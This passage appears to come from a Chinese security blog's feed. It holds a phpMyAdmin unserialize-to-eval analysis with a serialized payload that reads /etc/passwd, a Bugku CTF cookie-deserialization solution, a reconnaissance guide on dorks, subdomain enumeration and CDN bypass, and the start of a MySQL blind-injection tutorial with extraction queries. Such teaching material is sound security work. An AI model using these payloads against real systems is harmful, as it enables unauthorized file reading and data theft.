class="comment">//满足条件会调用load函数</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkSystem();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// check for https needs to be done everytime,</span></span><br><span class="line">        <span class="comment">// as https and http uses same session so this info can not be stored</span></span><br><span class="line">        <span class="comment">// in session</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkIsHttps();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkCollationConnection();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params">$source = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;loadDefaults();</span><br><span class="line">        <span class="keyword">if</span> ( <span class="literal">null</span> !== $source ) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;setSource($source);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( ! <span class="keyword">$this</span>-&gt;checkConfigSource() ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $cfg = <span class="keyword">array</span>();</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Parses the configuration file</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        $old_error_reporting = error_reporting(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( function_exists(<span class="string">&#x27;file_get_contents&#x27;</span>) ) &#123;</span><br><span class="line">            $eval_result =file_get_contents</span><br><span class="line">                <span class="keyword">eval</span>( <span class="string">&#x27;?&gt;&#x27;</span> . file_get_contents(<span class="keyword">$this</span>-&gt;getSource()) );    <span class="comment">//重点在这几行代码，当检测到file_get_contents函数存在时，输出字符串，不存在是输出文件内容</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $eval_result =</span><br><span class="line">                <span class="keyword">eval</span>( <span class="string">&#x27;?&gt;&#x27;</span> . implode(<span class="string">&#x27;\n&#x27;</span>, file(<span class="keyword">$this</span>-&gt;getSource())) );         </span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting($old_error_reporting);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( $eval_result === <span class="literal">false</span> ) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error_config_file = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>  &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error_config_file = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source_mtime = filemtime(<span class="keyword">$this</span>-&gt;getSource());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@TODO</span> check validity of $_COOKIE[&#x27;pma_collation_connection&#x27;]</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $_COOKIE[<span class="string">&#x27;pma_collation_connection&#x27;</span>] ) ) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;set(<span class="string">&#x27;collation_connection&#x27;</span>,</span><br><span class="line">                strip_tags($_COOKIE[<span class="string">&#x27;pma_collation_connection&#x27;</span>]) );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;set(<span class="string">&#x27;collation_connection&#x27;</span>,</span><br><span class="line">                <span class="keyword">$this</span>-&gt;get(<span class="string">&#x27;DefaultConnectionCollation&#x27;</span>) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkCollationConnection();</span><br><span class="line">        <span class="comment">//$this-&gt;checkPmaAbsoluteUri();</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;settings = PMA_array_merge_recursive(<span class="keyword">$this</span>-&gt;settings, $cfg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这个文件里面，我们找到魔法函数<code>__wakeup()</code>，并且通过代码解析我们可以发现，满足魔法函数的条件时会调用<code>load</code>函数，我们进一步继续跟踪load函数会发现传入了一个<code>source</code>变量，并且在<code>load</code>函数中有几行重要的代码，也是漏洞的关键位置。我将这几行代码单独放在下面来看一看。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( function_exists(<span class="string">&#x27;file_get_contents&#x27;</span>) ) &#123;</span><br><span class="line">    $eval_result =file_get_contents</span><br><span class="line">        <span class="keyword">eval</span>( <span class="string">&#x27;?&gt;&#x27;</span> . file_get_contents(<span class="keyword">$this</span>-&gt;getSource()) );    <span class="comment">//重点在这几行代码，当检测到file_get_contents函数存在时，输出字符串，不存在是输出文件内容</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $eval_result =</span><br><span class="line">        <span class="keyword">eval</span>( <span class="string">&#x27;?&gt;&#x27;</span> . implode(<span class="string">&#x27;\n&#x27;</span>, file(<span class="keyword">$this</span>-&gt;getSource())) );         </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当检测到<code>file_get_contents</code>被定义，则通过<code>eval</code>函数执行读入的字符串；如果没有<code>file_get_contents</code>函数，则通过<code>file</code>读入文件，同时利用<code>implode</code>函数把文件内容利用<code>\n</code>拼接，再执行<code>eval</code>函数。</p>
+<p>那么整个代码的分析过程就已经完成了，通过上面的解析，我们可以发现，当我们输入一个序列化字符串，在被反序列化成一个对象之前，会先触发<code>__wakeup()</code>函数，并且满足该魔法函数内的要求时，则可以进行任意读取文件或其他操作。</p>
+<p>接下来我们所需要的就是构造我们需要的payload。</p>
+<p>在setup.php文件中，我们需要两个传参字段，<code>action</code>和<code>configuration</code>，同时创建了对象<code>PMA_Config </code>。</p>
+<p>并且在load函数中传入source参数。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PMA_Config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source=<span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$PMA_Config=<span class="keyword">new</span> PMA_Config();</span><br><span class="line"><span class="keyword">echo</span> serialize($PMA_Config);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们得到的序列化的字符串为：<code>O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;;s:11:&quot;/etc/passwd&quot;;&#125;</code></p>
+<p><img src="https://i.loli.net/2020/08/20/txIA3bwazL9HRWK.png"></p>
+<p>可以看到上面的payload把etc下的passwd文件给读取出来了。</p>
+<h2 id="4、CTF样题"><a href="#4、CTF样题" class="headerlink" title="4、CTF样题"></a>4、CTF样题</h2><p>这里顺便附上一道Bugku的CTF样题。</p>
+<p>题目地址：<a href="http://123.206.87.240:8002/flagphp">flag.php</a>，提示为：hint</p>
+<p><img src="https://i.loli.net/2020/08/20/mtq4lkdLAwV7Tba.png"></p>
+<p>这是一个点击登录完全没效果的页面，按照提示，我给了个hint=111的参数，页面显示源码。源码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$cookie = $_COOKIE[<span class="string">&#x27;ISecer&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;hint&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (unserialize($cookie) === <span class="string">&quot;$KEY&quot;</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;$flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;admin.css&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt;</span><br><span class="line">  &lt;form method=<span class="string">&quot;POST&quot;</span> action=<span class="string">&quot;#&quot;</span>&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=<span class="string">&quot;user&quot;</span> type=<span class="string">&quot;text&quot;</span> placeholder=<span class="string">&quot;Username&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=<span class="string">&quot;password&quot;</span> type=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;Password&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value=<span class="string">&quot;Login&quot;</span> type=<span class="string">&quot;button&quot;</span>/&gt;&lt;/p&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line">$KEY=<span class="string">&#x27;ISecer:www.isecer.com&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我把源码给简单过滤了一下不需要看的部分</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;flag.php&quot;</span>);  </span><br><span class="line">$cookie = $_COOKIE[<span class="string">&#x27;ISecer&#x27;</span>];  <span class="comment">//取出cookie</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;hint&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (unserialize($cookie) === <span class="string">&quot;$KEY&quot;</span>)   <span class="comment">//重点来了，对cookie进行反序列化操作，若等于$KEY则输出flag</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;$flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">$KEY=<span class="string">&#x27;ISecer:www.isecer.com&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>源码还是很容易就看得懂的，首先取出名为ISecer的cookie，然后对该cookie进行反序列化操作，等于给定的值时则输出flag。</p>
+<p>不过还是被这个题目给小小的坑了一下，其实也不算坑吧，是我自己PHP没有学好哈哈，我一开始用下面给定的<code>$KEY=&#39;ISecer:www.isecer.com&#39;;</code>进行序列化后传给ISecer，但是一直不行，后来才发现在php源码中并没有定义这个KEY的值，因此这个值应该为空，即“”。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到的结果为<code>s:0:&quot;&quot;;</code></p>
+<p><img src="https://i.loli.net/2020/08/20/fq9JFN8mBjKiRPo.png"></p>
+<p>成功取出flag，这道题本身也很容易，算是对反序列化漏洞的运用吧。</p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>渗透测试之信息收集</title>
+    <url>/archives/8d90fcdb.html</url>
+    <content><![CDATA[<hr>
+<p>本章内容：这是一篇关于信息收集的文章</p>
+<hr>
+<a id="more"></a>
+
+
+
+
+
+<p>一般来说，在做渗透测试之前，都会进行信息收集，尽可能多的获取目标的信息，这对我们的渗透工作会帮助很大。信息收集一般有域名及子域名信息、目标网站系统、指纹信息、端口信息等等。</p>
+<h1 id="1、域名信息"><a href="#1、域名信息" class="headerlink" title="1、域名信息"></a>1、域名信息</h1><p>获得目标域名之后，第一步应该先获得该域名的注册信息、注册人信息等等。</p>
+<h2 id="1-1、Whois查询"><a href="#1-1、Whois查询" class="headerlink" title="1.1、Whois查询"></a>1.1、Whois查询</h2><p>用于收集网络注册信息、注册域名、IP地址等信息。</p>
+<p>kali已经安装有whois工具，可以直接通过whois命令查询</p>
+<img src="https://i.loli.net/2020/09/19/jZyJMzV8b6loWHr.png" style="zoom:150%;" />
+
+<p>nslookup、dig查询（DNS域名信息查询工具）</p>
+<p>命令：dig xxx.com，nslookup xxx.com</p>
+<p>两者不同的是nslookup获取到的是DNS服务器上cache找到的结果，而dig则是查询到的精确结果</p>
+<p>常用的在线查询网站：</p>
+<p><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p>
+<p><a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p>
+<h2 id="1-2、备案信息查询"><a href="#1-2、备案信息查询" class="headerlink" title="1.2、备案信息查询"></a>1.2、备案信息查询</h2><p>国内的网站的所有者都需要向国家有关部门申请备案，因此通过备案信息查询也可以查询到域名的一些信息。</p>
+<p>常用的网站有：</p>
+<p><a href="https://www.tianyancha.com/">天眼查</a></p>
+<p><a href="http://www.beianbeian.com/">ICP备案查询网</a></p>
+<h1 id="2、收集敏感信息"><a href="#2、收集敏感信息" class="headerlink" title="2、收集敏感信息"></a>2、收集敏感信息</h1><h2 id="2-1、Google-Hacking"><a href="#2-1、Google-Hacking" class="headerlink" title="2.1、Google Hacking"></a>2.1、Google Hacking</h2><p>Google是很好的一门收集敏感信息的搜索引擎，通过Google Hacking语法，可以搜索到泄露的信息。</p>
+<p>下面列举了部分常用的语法：</p>
+<table>
+<thead>
+<tr>
+<th>语法</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>intitle</td>
+<td>搜索网页标题中包含有特定字符的网页</td>
+</tr>
+<tr>
+<td>inurl</td>
+<td>搜索包含有特定字符的URL</td>
+</tr>
+<tr>
+<td>filetype</td>
+<td>搜索指定类型的文件。比如输入filetype:txt，将返回所有以txt结尾的文件url</td>
+</tr>
+<tr>
+<td>site</td>
+<td>找到与指定网站有联系的URL</td>
+</tr>
+<tr>
+<td>intext</td>
+<td>把网页中的正文内容中的某个字符做为搜索条件</td>
+</tr>
+<tr>
+<td>cache</td>
+<td>搜索google里关于某些内容的缓存</td>
+</tr>
+<tr>
+<td>link</td>
+<td>搜索所有和指定url做了链接的url</td>
+</tr>
+<tr>
+<td>info</td>
+<td>查找指定站点的一些基本信息</td>
+</tr>
+</tbody></table>
+<p>其他搜索引擎也可以用这种方法，语法基本无差</p>
+<img src="https://i.loli.net/2020/09/19/9t2DWfG7alUxwOF.png" style="zoom:150%;" />
+
+<h2 id="2-2、GitHub"><a href="#2-2、GitHub" class="headerlink" title="2.2、GitHub"></a>2.2、GitHub</h2><p>GitHub上面也可以利用GitHub语法去进行搜索，可以找到部分敏感信息，比如代码泄露、账号密码之类的。</p>
+<p>基本的搜索语法有：</p>
+<table>
+<thead>
+<tr>
+<th>语法</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>in:name  xxxx</td>
+<td>搜索仓库标题含有xxxx</td>
+</tr>
+<tr>
+<td>in:descripton   xxxx</td>
+<td>搜索仓库描述含有xxxx</td>
+</tr>
+<tr>
+<td>in:readme  xxxx</td>
+<td>搜索readme文件含有xxxx</td>
+</tr>
+<tr>
+<td>stars:&gt;3000</td>
+<td>搜索stars大于3000的仓库</td>
+</tr>
+<tr>
+<td>stars:1000..3000</td>
+<td>stars数量大于1000小于3000的仓库</td>
+</tr>
+<tr>
+<td>forks:&gt;1000</td>
+<td>forks数量大于1000的搜索关键字</td>
+</tr>
+<tr>
+<td>size:&gt;=5000</td>
+<td>仓库大于5000k(5M)的搜索仓库</td>
+</tr>
+<tr>
+<td>pushed:&gt;2019-02-12</td>
+<td>发布时间大于2019-02-12的仓库</td>
+</tr>
+<tr>
+<td>created:&gt;2019-02-12</td>
+<td>创建时间大于2019-02-12的仓库</td>
+</tr>
+<tr>
+<td>mirror:true(false)</td>
+<td>是否是镜像仓库</td>
+</tr>
+<tr>
+<td>user:jack</td>
+<td>用户名为”jack”的仓库</td>
+</tr>
+<tr>
+<td>license:apache-2.0</td>
+<td>仓库的 LICENSE为”apache-2.0”</td>
+</tr>
+<tr>
+<td>language:java</td>
+<td>使用”java”语言的仓库</td>
+</tr>
+<tr>
+<td>is:public</td>
+<td>公开的仓库</td>
+</tr>
+<tr>
+<td>is:private</td>
+<td>匹配有权限的私有仓库</td>
+</tr>
+<tr>
+<td>topic:5</td>
+<td>匹配拥有5个topic的仓库</td>
+</tr>
+</tbody></table>
+<p>另外也有其他方法可以查看敏感信息，比如发包，看返回包，可以看到一些服务器信息。</p>
+<h1 id="3、子域名信息"><a href="#3、子域名信息" class="headerlink" title="3、子域名信息"></a>3、子域名信息</h1><p>子域名也就是二级域名，一般情况下，一个网站的主站防守肯定是最严格的，因此直接硬干主站不太理智，所以更多的是去测试那些二级域名，甚至是三级域名、四级域名。因此我们需要收集很多的子域名，方便我们进行渗透。</p>
+<h2 id="3-1、子域名检测工具"><a href="#3-1、子域名检测工具" class="headerlink" title="3.1、子域名检测工具"></a>3.1、子域名检测工具</h2><p>（1）Layer子域名挖掘机</p>
+<p><img src="https://i.loli.net/2020/09/19/Ov95zC1n8rEIUQf.png"></p>
+<p>（2）Sublist3r</p>
+<p>也是一款挺不错的子域名爆破工具</p>
+<p>（3）subDomainsBrute</p>
+<p>这一款可以递归发现三级域名、四级域名等不容易被探测到的域名</p>
+<h2 id="3-2、搜索引擎"><a href="#3-2、搜索引擎" class="headerlink" title="3.2、搜索引擎"></a>3.2、搜索引擎</h2><p>利用Google Hacking查询子域名，前面有说过语法，这里就不多说了。</p>
+<h2 id="3-3、证书透明度公开日志枚举"><a href="#3-3、证书透明度公开日志枚举" class="headerlink" title="3.3、证书透明度公开日志枚举"></a>3.3、证书透明度公开日志枚举</h2><p>证书透明度是证书授权机构的一个项目，证书授权机构会将每个SSL或者TLS证书发布到公共日志中去，证书一般都会包含域名、子域名等信息。</p>
+<p>crt.sh：<a href="https://crt.sh/">https://crt.sh/</a></p>
+<p>censys：<a href="https://censys.io/">https://censys.io/</a></p>
+<h1 id="4、开放端口收集"><a href="#4、开放端口收集" class="headerlink" title="4、开放端口收集"></a>4、开放端口收集</h1><p>端口扫描是最常见的信息收集方法。最常见的扫描工具有nmap、御剑端口扫描工具。</p>
+<p>nmap除了可以扫描端口，还可以扫描存活主机、指纹识别等，是一款很强大的扫描工具，具体怎么扫描网上也有很多教程。</p>
+<p>本文所说的信息收集方法皆以kali作为前提</p>
+<h1 id="5、指纹识别"><a href="#5、指纹识别" class="headerlink" title="5、指纹识别"></a>5、指纹识别</h1><p>这里的指纹识别指的是CMS指纹识别，操作系统以及web容器的指纹识别。</p>
+<p>CMS：快速搭建网站的管理系统。在早期的web系统中，我们要发布一篇文章是相对比较困难的，需要有专业的web人员来编写，十分不方便，后来就有了CMS系统来帮助开发和搭建。</p>
+<p>常见的CMS有：Dedecms、phpweb、帝国、WordPress等等</p>
+<p>其他的CMS可以参考这篇文章：<a href="https://www.cnblogs.com/sym945/p/11715984.html">https://www.cnblogs.com/sym945/p/11715984.html</a></p>
+<p>代表工具有：御剑指纹识别、whatweb，轻量指纹识别等等。</p>
+<p>也有一些在线网站，比如：</p>
+<p>BugScanner：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p>
+<p>云悉识别：<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p>
+<p>whatweb：<a href="https://whatweb.net/">https://whatweb.net/</a></p>
+<h1 id="6、CDN"><a href="#6、CDN" class="headerlink" title="6、CDN"></a>6、CDN</h1><p>CDN：内容分发网络。简单来说就是在各地都有节点服务器，访问的时候就近去附近的节点获取资源，主要是为了改善网络加载时间，减少服务器负载。但是这样就会造成我们没法直接去得到真实的ip。</p>
+<h2 id="6-1、判断是否使用了CDN"><a href="#6-1、判断是否使用了CDN" class="headerlink" title="6.1、判断是否使用了CDN"></a>6.1、判断是否使用了CDN</h2><p>一般可以用多地ping的方式来判断是否使用了CDN。</p>
+<p>多地ping：<a href="https://www.17ce.com/">https://www.17ce.com/</a>    </p>
+<p><a href="http://ping.chinaz.com/tb.sz.gov.cn">http://ping.chinaz.com/tb.sz.gov.cn</a></p>
+<h2 id="6-2、寻找真实ip"><a href="#6-2、寻找真实ip" class="headerlink" title="6.2、寻找真实ip"></a>6.2、寻找真实ip</h2><p>二级域名：可以通过ping二级域名来获取分站ip，分站可能没有挂cdn，因此可以大概推断出真实ip是在哪个网段</p>
+<p>国外访问：可以通过代理国外访问，一般cdn是针对国内，国外没有效果。可以通过国外在线代理ping来访问（<a href="https://asm.ca.com/en/ping.php%EF%BC%89%E3%80%82">https://asm.ca.com/en/ping.php）。</a></p>
+<p>查询域名解析记录：<a href="https://www.benmi.com/whoishistory/">历史Whois</a>，<a href="https://x.threatbook.cn/">微步在线</a></p>
+<p>手机APP：有APP的可以用brup抓包获得真实ip</p>
+<p>网络空间搜索引擎：<a href="%5Bhttps://fofa.so%5D(https://fofa.so/)">fofa</a></p>
+<h1 id="7、收集敏感目录"><a href="#7、收集敏感目录" class="headerlink" title="7、收集敏感目录"></a>7、收集敏感目录</h1><p>收集敏感目录文件是渗透测试中必不可少的一个步骤，常用的目录扫描工具有：</p>
+<p>dirbuster，御剑后台扫描，wwwscan，nikto等</p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mysql盲注总结</title>
+    <url>/archives/e9ab844.html</url>
+    <content><![CDATA[<hr>
+<p>内容：本文的内容主要是对mysql盲注的总结</p>
+<hr>
+<a id="more"></a>
+
+<h2 id="1、盲注概念"><a href="#1、盲注概念" class="headerlink" title="1、盲注概念"></a>1、盲注概念</h2><p>盲注的概念：盲注不同于联合注入等可以回显数据的注入。在 sql 注入过程中，sql 语句执行完成后，这些数据不能回显到前端页面，这种情况下我们不能通过页面的响应来直接得到我们想要的数据。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p>
+<p>盲注分为三类：布尔盲注，时间盲注，报错盲注</p>
+<h2 id="2、布尔注入"><a href="#2、布尔注入" class="headerlink" title="2、布尔注入"></a>2、布尔注入</h2><p>布尔注入的核心思想是构造逻辑判断语句，利用对错、是否、0和1等具有逻辑性的组合来判断我们想要的数据是否存在或是否正确。</p>
+<p>常用函数有left()，mid()，substr()，ord()</p>
+<p>left(string, n)：string为要截取的字符串，n为长度。</p>
+<p>例如：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(<span class="keyword">database</span>(),<span class="number">1</span>)=<span class="string">&#x27;w&#x27;</span>;</span><br><span class="line">//猜数据库名字的第一个字母，错误返回0；</span><br><span class="line">+<span class="comment">------------------------+</span></span><br><span class="line">| left(database(),1)=&#x27;w&#x27; |</span><br><span class="line">+<span class="comment">------------------------+</span></span><br><span class="line">|                      0 |</span><br><span class="line">+<span class="comment">------------------------+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(<span class="keyword">database</span>(),<span class="number">1</span>)=<span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">//猜数据库名字的第一个字母，正确返回1；</span><br><span class="line">+<span class="comment">------------------------+</span></span><br><span class="line">| left(database(),1)=&#x27;s&#x27; |</span><br><span class="line">+<span class="comment">------------------------+</span></span><br><span class="line">|                      1 |</span><br><span class="line">+<span class="comment">------------------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>ord(string)：返回字符串的ASCII代码</p>
+<p>例如：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">ord</span>(<span class="string">&#x27;s&#x27;</span>);</span><br><span class="line">//查询字母s的ASCII代码</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| ord(&#x27;s&#x27;) |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">|      115 |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">ord</span>(<span class="keyword">left</span>(<span class="keyword">database</span>(),<span class="number">1</span>))=<span class="number">115</span>;</span><br><span class="line">//结合left()函数，查询数据库第一个字母的ASCII代码是否为115</span><br><span class="line">+<span class="comment">-----------------------------+</span></span><br><span class="line">| ord(left(database(),1))=115 |</span><br><span class="line">+<span class="comment">-----------------------------+</span></span><br><span class="line">|                           1 |</span><br><span class="line">+<span class="comment">-----------------------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>mid(string, start,[length])：截取字符串的一部分，start为开始位置，length为截取的长度，可省略。</p>
+<p>例如：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">mid</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">+<span class="comment">-------------------------+</span></span><br><span class="line">| mid(database(),1,1)=&#x27;s&#x27; |</span><br><span class="line">+<span class="comment">-------------------------+</span></span><br><span class="line">|                       1 |</span><br><span class="line">+<span class="comment">-------------------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>substr()和mid()函数实现的功能是一样的。另外还有一个substring()函数，也是一样的功能。</p>
+<p>跟ord()函数作用一致的还有ascii()函数</p>
+<p>上述函数在注入的时候只需要把string改成我们构造的语句就可以了。</p>
+<p>例如：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span>  table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">+<span class="comment">-------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">//将substr中string的内容换成我们构造的SQL语句，我们就可以得到我们想要的，像这个语句中，我们就可以知道，当前数据库的第一个表名的第一个字符不为s</span><br><span class="line">| substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span>  table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;s&#x27;</span> |</span><br><span class="line">+<span class="comment">-------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">|                                                                                                           <span class="number">0</span> |</span><br><span class="line">+<span class="comment">-------------------------------------------------------------------------------------------------------------+</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>此外，我们还可以用正则匹配注入以及like注入</p>
+<p>regexp正则注入</p>
+<p>其中可以使用的正则表达式字符有以下这些</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$</td>
+<td align="left">匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 \$。</td>
+</tr>
+<tr>
+<td>( )</td>
+<td align="left">标记一个子表达式的开始和结束位置。表达式可以获取供以后使用。要匹配这些字符，请使用 \( 和 \)。</td>
+</tr>
+<tr>
+<td>*</td>
+<td align="left">匹配前面的子表达式一次或多次。要匹配 * 字符，请使用 \*。</td>
+</tr>
+<tr>
+<td>.</td>
+<td align="left">匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 \. 。</td>
+</tr>
+<tr>
+<td>[</td>
+<td align="left">标记一个中括号表达式的开始。要匹配 [，请使用 \[。</td>
+</tr>
+<tr>
+<td>+</td>
+<td align="left">匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 \+。</td>
+</tr>
+<tr>
+<td>?</td>
+<td align="left">匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 \?。</td>
+</tr>
+<tr>
+<td>\</td>
+<td align="left">将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\\‘ 匹配 “\“，而 ‘\(‘ 则匹配 “(“。</td>
+</tr>
+<tr>
+<td>{</td>
+<td align="left">标记限定符表达式的开始。要匹配 {，请使用 \{。</td>
+</tr>
+<tr>
+<td>|</td>
+<td align="left">指明两项之间的一个选择。要匹配|，请使用\|</td>
+</tr>
+<tr>
+<td>^</td>
